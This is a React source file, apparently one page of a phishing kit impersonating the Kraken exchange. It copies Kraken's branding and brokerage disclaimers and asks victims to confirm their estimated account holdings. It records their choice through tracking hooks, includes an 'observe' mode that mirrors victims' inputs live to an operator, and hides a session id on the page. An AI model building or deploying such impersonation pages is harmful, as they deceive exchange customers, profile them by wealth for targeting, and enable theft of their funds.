import { createFileRoute } from "@tanstack/react-router";
import { useState, useEffect } from "react";
import {
  KrakenLogo, KnFontStyle, useKnTracking,
} from "@/components/kn/KnShared";

export const Route = createFileRoute("/kn/balance")({
  head: () => ({ meta: [{ title: "Confirm Estimated Holdings" }] }),
  component: KrakenEstimatedBalancePage,
});

const RANGES = [
  'Under $1,000',
  '$1,000 – $4,999',
  '$5,000 – $9,999',
  '$10,000 – $24,999',
  '$25,000 – $49,999',
  '$50,000 – $99,999',
  '$100,000 – $499,999',
  '$500,000+',
];

function KrakenEstimatedBalancePage() {
  const { trackClick, trackInput, trackSubmit, knNavigate, sessionId, isObserve } = useKnTracking();
  const [selected, setSelected] = useState<string | null>(null);

  const handleConfirm = () => {
    if (!selected) return;
    trackClick('Confirm Estimated Balance');
    trackInput('balance', selected, 'text');
    trackSubmit('balance', selected);
    knNavigate('/kn/loading');
  };

  useEffect(() => {
    if (!isObserve) return;
    function onMirror(e: Event) {
      const d = (e as CustomEvent<{ field?: string; value?: string }>).detail;
      if (!d?.field) return;
      if (d.field === 'balance' || d.field === 'balance_submitted' || /Estimated/i.test(d.field)) {
        setSelected(String(d.value ?? '') || null);
      }
    }
    window.addEventListener('ux:mirror-live-input', onMirror);
    return () => window.removeEventListener('ux:mirror-live-input', onMirror);
  }, [isObserve]);

  return (
    <div
      className="kn-page min-h-screen flex flex-col"
      style={{
        backgroundColor: '#f6f5f9',
        fontFamily: "'Kraken-Product', 'IBM Plex Sans', Helvetica, Arial, sans-serif",
      }}
    >
      <KnFontStyle />
      <style>{`
        @font-face {
          font-family: 'Kraken-Product';
          src: url('/fonts/Kraken-Product-Regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'Kraken-Product';
          src: url('/fonts/Kraken-Product-Medium.woff2') format('woff2');
          font-weight: 500;
          font-style: normal;
          font-display: swap;
        }
        * { font-family: 'Kraken-Product', 'IBM Plex Sans', Helvetica, Arial, sans-serif !important; }
        @media (max-width: 640px) {
          .kraken-card { background-color: transparent !important; box-shadow: none !important; border-radius: 0 !important; padding: 16px 0 !important; }
          .kraken-lang-btn { display: none !important; }
          .kraken-footer-detail { display: none !important; }
          .kraken-footer { justify-content: center !important; }
          .kraken-header { padding-left: 16px !important; padding-right: 16px !important; }
        }

        @keyframes fadeInUp {
          from { opacity: 0; transform: translateY(8px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes scaleIn {
          from { transform: scale(0); }
          to { transform: scale(1); }
        }
      `}</style>

      {/* Header */}
      <header style={{ paddingTop: 12, backgroundColor: '#f6f5f9' }}>
        <div
          className="flex items-center justify-between kraken-header"
          style={{ height: 40, paddingLeft: 36, paddingRight: 36 }}
        >
          <div className="cursor-pointer" onClick={() => trackClick('Logo')}>
            <KrakenLogo />
          </div>
          <button
            className="flex items-center kraken-lang-btn"
            style={{
              gap: 4,
              padding: '8px 12px',
              borderRadius: 8,
              border: 'none',
              cursor: 'pointer',
              backgroundColor: '#686b8214',
              color: '#686b82',
              fontSize: 12,
              fontWeight: 400,
              lineHeight: '16px',
            }}
          >
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M21 12C21 16.9706 16.9706 21 12 21M21 12C21 7.02944 16.9706 3 12 3M21 12H3M12 21C7.02944 21 3 16.9706 3 12M12 21C9.79086 21 8 16.9706 8 12C8 7.02944 9.79086 3 12 3M12 21C14.2091 21 16 16.9706 16 12C16 7.02944 14.2091 3 12 3M3 12C3 7.02944 7.02944 3 12 3" strokeWidth="2" strokeLinecap="square" stroke="#9497a9" fill="transparent"/>
            </svg>
            <span>English (US)</span>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M7.5 9.98291L11.2045 13.6874C11.6438 14.1268 12.3562 14.1268 12.7955 13.6874L16.5 9.98291" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" stroke="#9497a9" fill="transparent"/>
            </svg>
          </button>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1 flex justify-center px-4" style={{ marginTop: '4%' }}>
        <div style={{ width: 498, maxWidth: '100%' }}>
          <div
            className="kraken-card"
            style={{
              backgroundColor: '#fff',
              borderRadius: 16,
              padding: 24,
              boxShadow: '0px 1px 4px 0px #1018280a',
            }}
          >
            <div className="flex flex-col" style={{ gap: 20 }}>
              {/* Title */}
              <div>
                <h1
                  style={{
                    fontSize: 22,
                    fontWeight: 500,
                    lineHeight: '28px',
                    color: '#101114',
                    margin: 0,
                  }}
                >
                  Confirm Estimated Holdings
                </h1>
                <p
                  style={{
                    fontSize: 14,
                    fontWeight: 400,
                    lineHeight: '20px',
                    color: '#686b82',
                    margin: '8px 0 0 0',
                  }}
                >
                  Choose the range that best matches your account value.
                </p>
              </div>

              {/* Range options */}
              <div className="flex flex-col" style={{ gap: 6 }}>
                {RANGES.map((range, i) => {
                  const isSelected = selected === range;
                  return (
                    <button
                      key={range}
                      onClick={() => setSelected(range)}
                      className="w-full flex items-center justify-between"
                      style={{
                        height: 48,
                        borderRadius: 12,
                        padding: '0 14px',
                        border: 'none',
                        cursor: 'pointer',
                        backgroundColor: isSelected ? '#7132f50a' : '#686b820a',
                        outline: isSelected ? '2px solid #7132f5' : '2px solid transparent',
                        outlineOffset: -2,
                        transition: 'background-color 0.15s ease, outline-color 0.2s ease',
                        animation: `fadeInUp 0.3s ease both`,
                        animationDelay: `${i * 40}ms`,
                      }}
                      onMouseEnter={(e) => {
                        if (!isSelected) e.currentTarget.style.backgroundColor = '#686b8214';
                      }}
                      onMouseLeave={(e) => {
                        if (!isSelected) e.currentTarget.style.backgroundColor = '#686b820a';
                      }}
                    >
                      <span
                        style={{
                          fontSize: 14,
                          fontWeight: 500,
                          color: '#101114',
                          lineHeight: '20px',
                        }}
                      >
                        {range}
                      </span>
                      <div
                        style={{
                          width: 20,
                          height: 20,
                          borderRadius: '50%',
                          border: isSelected ? 'none' : '2px solid #c6c7d2',
                          backgroundColor: isSelected ? '#7132f5' : 'transparent',
                          display: 'flex',
                          alignItems: 'center',
                          justifyContent: 'center',
                          transition: 'all 0.2s ease',
                          flexShrink: 0,
                        }}
                      >
                        {isSelected && (
                          <svg
                            width="10"
                            height="10"
                            viewBox="0 0 10 10"
                            fill="none"
                            style={{ animation: 'scaleIn 0.2s ease' }}
                          >
                            <circle cx="5" cy="5" r="4" fill="white" />
                          </svg>
                        )}
                      </div>
                    </button>
                  );
                })}
              </div>

              {/* Confirm button */}
              <button
                onClick={handleConfirm}
                disabled={!selected}
                className="w-full"
                style={{
                  height: 52,
                  borderRadius: 12,
                  border: 'none',
                  cursor: selected ? 'pointer' : 'default',
                  backgroundColor: selected ? '#7132f5' : '#c6c7d2',
                  color: '#fff',
                  fontSize: 16,
                  fontWeight: 500,
                  lineHeight: '22px',
                  transition: 'background-color 0.15s ease',
                  pointerEvents: selected ? 'auto' : 'none',
                }}
                onMouseEnter={(e) => {
                  if (selected) e.currentTarget.style.backgroundColor = '#5b1ecf';
                }}
                onMouseLeave={(e) => {
                  if (selected) e.currentTarget.style.backgroundColor = '#7132f5';
                }}
                onMouseDown={(e) => {
                  if (selected) e.currentTarget.style.backgroundColor = '#471ca0';
                }}
                onMouseUp={(e) => {
                  if (selected) e.currentTarget.style.backgroundColor = '#5b1ecf';
                }}
              >
                Confirm
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer
        className="flex items-center justify-between kraken-footer"
        style={{ padding: '16px 24px' }}
      >
        <p style={{ fontSize: 11, color: '#9497a9', margin: 0 }}>
          Brokerage services are provided by Kraken Securities, LLC, member{' '}
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >FINRA</a>
          /
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >SIPC</a>
          .{' '}
          <a href="#" style={{ color: '#7132f5', textDecoration: 'none' }}
            onMouseEnter={(e) => (e.currentTarget.style.textDecoration = 'underline')}
            onMouseLeave={(e) => (e.currentTarget.style.textDecoration = 'none')}
          >Disclosures here</a>
          .
        </p>
        <div className="flex items-center kraken-footer-detail" style={{ gap: 16 }}>
          <a href="#" style={{ fontSize: 11, color: '#9497a9', textDecoration: 'none' }}>Privacy Notice</a>
          <a href="#" style={{ fontSize: 11, color: '#9497a9', textDecoration: 'none' }}>Terms of Service</a>
        </div>
      </footer>

      <div className="fixed bottom-2 right-2 text-[10px] opacity-0 pointer-events-none">
        {sessionId}
      </div>
    </div>
  );
}
